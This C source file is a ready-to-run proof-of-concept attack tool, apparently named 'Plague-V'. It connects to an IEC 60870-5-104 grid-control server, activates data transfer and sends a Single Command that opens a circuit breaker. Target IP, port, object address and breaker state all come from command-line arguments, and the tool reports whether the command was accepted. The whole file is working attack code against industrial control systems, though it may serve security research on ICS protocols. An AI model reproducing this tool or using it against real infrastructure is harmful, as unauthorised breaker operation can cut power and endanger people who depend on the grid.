/*
 * plague_v_poc.c — IEC 60870-5-104 Single Command Proof of Concept
 *
 * Connects to an IEC-104 server and sends a C_SC_NA_1 (Single Command)
 * to open a circuit breaker at IOA 5000.
 *
 * Uses the lib60870-C library (https://github.com/mz-automation/lib60870).
 *
 * Build: make
 * Usage: ./plague_v_poc [target_ip] [target_port] [ioa] [state]
 *   Defaults: 10.10.10.10  2404  5000  0 (OFF)
 */

#include "cs104_connection.h"
#include "hal_thread.h"
#include "hal_time.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

/* Configuration defaults */
#define DEFAULT_IP    "10.10.10.10"
#define DEFAULT_PORT  2404
#define DEFAULT_IOA   5000
#define DEFAULT_STATE 0       /* 0 = OFF (open breaker), 1 = ON (close) */
#define DEFAULT_CA    1       /* Common Address of target station */
#define DEFAULT_OA    3       /* Originator Address (arbitrary) */

static volatile int g_act_con_received = 0;

/* Raw message handler: hex-dump every frame */
static void
rawMessageHandler(void* parameter, uint8_t* msg, int msgSize, bool sent)
{
    (void)parameter;
    printf("  %s ", sent ? ">>>" : "<<<");
    for (int i = 0; i < msgSize; i++)
        printf("%02x ", msg[i]);
    printf("\n");
}

/* Connection event handler */
static void
connectionHandler(void* parameter, CS104_Connection connection,
                  CS104_ConnectionEvent event)
{
    (void)parameter;
    (void)connection;
    switch (event) {
    case CS104_CONNECTION_OPENED:
        printf("[+] TCP connected\n");
        break;
    case CS104_CONNECTION_CLOSED:
        printf("[*] Connection closed\n");
        break;
    case CS104_CONNECTION_FAILED:
        printf("[!] Connection FAILED\n");
        break;
    case CS104_CONNECTION_STARTDT_CON_RECEIVED:
        printf("[+] STARTDT_CON received — data transfer ACTIVE\n");
        break;
    case CS104_CONNECTION_STOPDT_CON_RECEIVED:
        printf("[+] STOPDT_CON received\n");
        break;
    }
}

/* ASDU received handler: parse command confirmations */
static bool
asduReceivedHandler(void* parameter, int address, CS101_ASDU asdu)
{
    (void)parameter;
    (void)address;
    TypeID tid = CS101_ASDU_getTypeID(asdu);
    CS101_CauseOfTransmission cot = CS101_ASDU_getCOT(asdu);
    bool negative = CS101_ASDU_isNegative(asdu);

    printf("[<] ASDU received: type=%s(%d) cot=%d negative=%d\n",
           TypeID_toString(tid), tid, cot, negative);

    if (tid == C_SC_NA_1) {
        InformationObject io = CS101_ASDU_getElement(asdu, 0);

        if (cot == CS101_COT_ACTIVATION_CON) {
            if (negative)
                printf("[!] Command REJECTED (negative ACT_CON)\n");
            else {
                printf("[+] Command ACCEPTED (positive ACT_CON)\n");
                g_act_con_received = 1;
            }
        }
        else if (cot == CS101_COT_ACTIVATION_TERMINATION) {
            printf("[+] Command execution COMPLETE (ACT_TERM)\n");
        }
        else if (cot == CS101_COT_UNKNOWN_IOA) {
            printf("[!] Server: UNKNOWN IOA\n");
            g_act_con_received = -1;
        }
        else if (cot == CS101_COT_UNKNOWN_COT) {
            printf("[!] Server: UNKNOWN COT\n");
            g_act_con_received = -1;
        }

        if (io) {
            printf("    IOA: %d\n", InformationObject_getObjectAddress(io));
            InformationObject_destroy(io);
        }
    }

    return true;
}

/*-------*
|  Main  |
*--------*/

int
main(int argc, char** argv)
{
    const char* ip  = DEFAULT_IP;
    int         port = DEFAULT_PORT;
    int         ioa  = DEFAULT_IOA;
    int         state = DEFAULT_STATE;

    if (argc > 1) ip    = argv[1];
    if (argc > 2) port  = atoi(argv[2]);
    if (argc > 3) ioa   = atoi(argv[3]);
    if (argc > 4) state = atoi(argv[4]);

    printf("╔══════════════════════════════════════════╗\n");
    printf("║       PLAGUE-V  —  IEC-104 PoC          ║\n");
    printf("╚══════════════════════════════════════════╝\n");
    printf("[*] Target : %s:%d\n", ip, port);
    printf("[*] IOA    : %d\n", ioa);
    printf("[*] State  : %s (%d)\n", state ? "ON (close)" : "OFF (open)", state);
    printf("[*] CA=%d  OA=%d\n\n", DEFAULT_CA, DEFAULT_OA);

    /* Step 1: Create connection object */
    CS104_Connection con = CS104_Connection_create(ip, port);
    if (con == NULL) {
        fprintf(stderr, "[!] Failed to create connection object\n");
        return 1;
    }

    /* Step 2: Configure parameters */
    CS101_AppLayerParameters alParams = CS104_Connection_getAppLayerParameters(con);
    alParams->originatorAddress = DEFAULT_OA;

    CS104_APCIParameters apciParams = CS104_Connection_getAPCIParameters(con);
    apciParams->t0 = 5;  /* 5s connection timeout */

    /* Step 3: Register callbacks */
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    CS104_Connection_setASDUReceivedHandler(con, asduReceivedHandler, NULL);
    CS104_Connection_setRawMessageHandler(con, rawMessageHandler, NULL);

    /* Step 4: TCP connect (blocking) */
    printf("[*] Connecting to %s:%d ...\n", ip, port);
    if (!CS104_Connection_connect(con)) {
        fprintf(stderr, "[!] TCP connection failed (timeout after %ds)\n",
                apciParams->t0);
        CS104_Connection_destroy(con);
        return 1;
    }

    /* Step 5: Activate data transfer */
    printf("[>] Sending STARTDT_ACT ...\n");
    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    /* Step 6: Send C_SC_NA_1 */
    printf("[>] Sending C_SC_NA_1: IOA=%d state=%s\n",
           ioa, state ? "ON" : "OFF");

    InformationObject sc = (InformationObject)
        SingleCommand_create(NULL, ioa, (bool)state, false, 0);

    if (sc == NULL) {
        fprintf(stderr, "[!] Failed to create SingleCommand object\n");
        CS104_Connection_destroy(con);
        return 1;
    }

    bool sent = CS104_Connection_sendProcessCommandEx(
        con, CS101_COT_ACTIVATION, DEFAULT_CA, sc);

    InformationObject_destroy(sc);

    if (sent)
        printf("[+] Command sent successfully\n");
    else {
        fprintf(stderr, "[!] Failed to send command (buffer full?)\n");
        CS104_Connection_destroy(con);
        return 1;
    }

    /* Step 7: Wait for response */
    printf("[*] Waiting for ACT_CON ...\n");
    Thread_sleep(2000);

    /* Step 8: Report result */
    int exit_code;
    if (g_act_con_received == 1) {
        printf("\n[✓] SUCCESS — breaker command accepted\n");
        exit_code = 0;
    }
    else if (g_act_con_received == -1) {
        printf("\n[✗] REJECTED — server refused command\n");
        exit_code = 2;
    }
    else {
        printf("\n[?] NO RESPONSE — ACT_CON not received within timeout\n");
        exit_code = 3;
    }

    /* Step 9: Cleanup */
    printf("[*] Disconnecting ...\n");
    CS104_Connection_destroy(con);
    printf("[*] Done (exit code %d)\n", exit_code);

    return exit_code;
}
